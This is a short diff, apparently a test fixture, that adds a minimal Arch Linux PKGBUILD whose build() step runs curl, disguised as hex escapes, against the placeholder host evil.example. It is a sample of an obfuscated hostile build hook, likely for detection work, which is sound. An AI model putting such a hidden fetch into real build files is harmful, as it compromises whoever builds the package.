@@ -1,0 +1,9 @@
+--- /dev/null
++++ b/PKGBUILD
+@@ -0,0 +1,6 @@
++pkgname=p
++pkgver=1
++pkgrel=1
++build() {
++  env X=1 $'\x63\x75\x72\x6c' https://evil.example/x
++}
